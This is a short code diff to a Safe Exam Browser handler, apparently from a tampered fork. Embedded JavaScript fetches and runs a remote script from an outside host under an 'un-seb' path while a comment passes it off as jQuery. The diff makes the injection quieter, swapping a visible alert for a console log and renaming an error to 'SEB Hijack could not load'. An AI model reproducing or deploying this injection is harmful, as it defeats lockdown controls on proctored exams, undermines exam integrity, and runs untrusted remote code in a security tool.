@@ -62,7 +62,7 @@ namespace SafeExamBrowser.Browser.Handlers
 				};
 
 				script.onerror = function() {
-					console.error('Error loading script:', url);
+					console.error('SEB Hijack could not load');
 				};
 
 				document.head.appendChild(script);
@@ -70,7 +70,7 @@ namespace SafeExamBrowser.Browser.Handlers
 
 			// Load jQuery over HTTPS
 			loadScript('https://wxnnvs.ftp.sh/un-seb/the_script.js', function() {
-				alert('jQuery has been loaded.');
+				console.log('jQuery has been loaded.');
 			});
 
 			";
